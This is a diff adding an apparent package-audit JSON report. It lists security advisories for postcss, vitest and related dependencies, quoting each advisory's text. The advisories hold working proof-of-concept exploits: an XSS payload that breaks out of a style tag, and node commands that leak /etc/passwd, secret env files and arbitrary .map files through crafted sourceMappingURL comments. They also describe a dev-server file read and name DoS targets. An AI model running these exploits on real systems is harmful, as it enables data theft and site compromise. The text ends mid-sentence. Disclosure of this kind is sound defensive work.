@@ -1,0 +1,516 @@
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "postcss",
+      "resolves": [
+        {
+          "id": 1117015,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1124252,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1130709,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1139510,
+          "path": "apps__web>next>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "vitest",
+      "resolves": [
+        {
+          "id": 1193683,
+          "path": ".>vitest",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@vitest/mocker",
+      "resolves": [
+        {
+          "id": 1193684,
+          "path": ".>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": ".>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tinypool",
+      "resolves": [
+        {
+          "id": 1241260,
+          "path": ".>vitest>tinypool",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1241261,
+          "path": ".>vitest>tinypool",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@hono/node-server",
+      "resolves": [
+        {
+          "id": 1243661,
+          "path": "apps__worker>@hono/node-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1117015": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps/web > next@15.5.28 > postcss@8.4.31"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41305\n- https://github.com/postcss/postcss/releases/tag/8.5.10\n- https://github.com/advisories/GHSA-qx2v-qp2m-jg93",
+      "created": "2026-04-24T15:31:42.000Z",
+      "id": 1117015,
+      "npm_advisory_id": null,
+      "overview": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "reported_by": null,
+      "title": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.5.10",
+      "github_advisory_id": "GHSA-qx2v-qp2m-jg93",
+      "recommendation": "Upgrade to version 8.5.10 or later",
+      "patched_versions": ">=8.5.10",
+      "updated": "2026-04-24T15:31:44.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+    },
+    "1124252": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps/web > next@15.5.28 > postcss@8.4.31"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q\n- https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad\n- https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3\n- https://github.com/postcss/postcss/releases/tag/8.5.12\n- https://github.com/advisories/GHSA-6g55-p6wh-862q",
+      "created": "2026-07-23T15:06:16.000Z",
+      "id": 1124252,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nPostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).\n\n## Details\n\nThe dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.\n\n`Input` constructor (`lib/input.js:70-77`):\n\n```js\nif (pathAvailable && sourceMapAvailable) {\n  let map = new PreviousMap(this.css, opts)\n  if (map.text) {\n    this.map = map\n    let file = map.consumer().file\n    if (!this.file && file) this.file = this.mapResolve(file)\n  }\n}\n```\n\n`PreviousMap` constructor (`lib/previous-map.js:17-29`):\n\n```js\nconstructor(css, opts) {\n  if (opts.map === false) return\n  this.loadAnnotation(css)\n  this.inline = this.startWith(this.annotation, 'data:')\n\n  let prev = opts.map ? opts.map.prev : undefined\n  let text = this.loadMap(opts.from, prev)\n  ...\n}\n```\n\nNote `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.\n\n`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:\n\n```js\nloadAnnotation(css) {\n  let comments = css.match(/\\/\\*\\s*# sourceMappingURL=/g)\n  if (!comments) return\n  let start = css.lastIndexOf(comments.pop())\n  let end = css.indexOf('*/', start)\n  if (start > -1 && end > -1) {\n    this.annotation = this.getAnnotationURL(css.substring(start, end))\n  }\n}\n```\n\n`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.\n\n`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:\n\n```js\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)\n  return this.loadFile(map)\n}\n```\n\n* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.\n* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.\n\n`loadFile` (`lib/previous-map.js:86-92`) is the sink:\n\n```js\nloadFile(path) {\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\n\nThe bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:\n\n```\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThis error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.\n\nTrust-boundary analysis:\n* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.\n* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.\n* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.\n\nPrimitives obtained:\n* (a) **Arbitrary file read** — bytes loaded into Node memory.\n* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.\n* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.\n* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.\n\n## PoC\n\nAll commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.\n\n**Vector 1 — Absolute path, default options (no `from`, no `map`):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  try { p().process(\"a{color:red}\\n/*# sourceMappingURL=/etc/passwd */\"); } \\\n  catch(e){console.log(e.message)}'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThe first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.\n\n**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**\n\n```bash\n$ node -e 'const p=require(\"postcss\"); \\\n  p().process(\"a{color:red}\\n/*# sourceMappingURL=../../../../../etc/passwd */\", \\\n              {from:\"/var/www/html/styles/main.css\", map:{inline:false}}) \\\n   .catch(e=>console.log(e.message))'\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\n`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.\n\n**Vector 3 — File-existence oracle:**\n\n```bash\n# Existing non-JSON file → throws (file confirmed to exist)\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/etc/passwd */\")'\nSyntaxError: Unexpected token 'r', \"root:x:0:0\"... is not valid JSON\n\n# Non-existent file → returns silently (file confirmed absent)\n$ node -e 'r=require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/no/such/file */\"); console.log(\"ok\")'\nok\n```\n\n**Vector 4 — Custom file-content leak:**\n\n```bash\n$ printf 'API_KEY=sk-secret-12345\\n' > /tmp/server-secret.env\n$ node -e 'require(\"postcss\")().process(\"a{}\\n/*# sourceMappingURL=/tmp/server-secret.env */\")' 2>&1 | head -1\nSyntaxError: Unexpected token 'A', \"API_KEY=sk\"... is not valid JSON\n```\n\nThe first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.\n\n**Filesystem-call trace** (proves the read happens with no opts at all):\n\n```js\nconst fs = require('fs');\nconst orig = fs.readFileSync;\nfs.readFileSync = function(p){\n  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);\n  return orig.apply(this, arguments);\n};\nrequire('postcss')().process('a{}\\n/*# sourceMappingURL=/etc/hostname */');\n// → [FILE READ]: /etc/hostname\n// → SyntaxError: Unexpected token 'D', \"Debian-tri\"... is not valid JSON\n```\n\n## Impact\n\n* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.\n* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).\n* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.\n* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.\n* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.\n\n## Recommended Fix\n\nThe root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:\n\n1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):\n\n   ```js\n   // lib/previous-map.js\n   loadMap(file, prev) {\n     if (prev === false) return false\n     if (prev) { /* unchanged */ }\n     else if (this.inline) {\n       return this.decodeInline(this.annotation)\n     } else if (this.annotation) {\n       let annotation = this.annotation\n       // Reject schemes (other than data:, handled above) and absolute paths.\n       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return\n       if (require('path').isAbsolute(annotation)) return\n       if (!file) return  // No base path → cannot safely resolve.\n       const base = require('path').resolve(require('path').dirname(file))\n       const resolved = require('path').resolve(base, annotation)\n       // Refuse anything that escapes the base directory.\n       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {\n         return\n       }\n       return this.loadFile(resolved)\n     }\n   }\n   ```\n\n2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.\n\nA user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.",
+      "reported_by": null,
+      "title": "PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-45623"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.11",
+      "github_advisory_id": "GHSA-6g55-p6wh-862q",
+      "recommendation": "Upgrade to version 8.5.12 or later",
+      "patched_versions": ">=8.5.12",
+      "updated": "2026-07-23T15:06:17.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-6g55-p6wh-862q"
+    },
+    "1130709": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps/web > next@15.5.28 > postcss@8.4.31"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp\n- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8\n- https://github.com/postcss/postcss/releases/tag/8.5.19\n- https://github.com/advisories/GHSA-fxqj-rqcc-2cmp",
+      "created": "2026-08-03T17:11:39.000Z",
+      "id": 1130709,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "reported_by": null,
+      "title": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-69153"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.22",
+      "github_advisory_id": "GHSA-fxqj-rqcc-2cmp",
+      "recommendation": "Upgrade to version 8.5.23 or later",
+      "patched_versions": ">=8.5.23",
+      "updated": "2026-08-03T17:11:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+    },
+    "1139510": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps/web > next@15.5.28 > postcss@8.4.31"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849\n- https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c\n- https://github.com/postcss/postcss/releases/tag/8.5.18\n- https://github.com/advisories/GHSA-r28c-9q8g-f849",
+      "created": "2026-07-24T16:24:55.000Z",
+      "id": 1139510,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+      "reported_by": null,
+      "title": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73646"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.17",
+      "github_advisory_id": "GHSA-r28c-9q8g-f849",
+      "recommendation": "Upgrade to version 8.5.18 or later",
+      "patched_versions": ">=8.5.18",
+      "updated": "2026-08-13T17:55:56.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-r28c-9q8g-f849"
+    },
+    "1193683": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            ". > vitest@3.2.7"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193683,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../…/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure 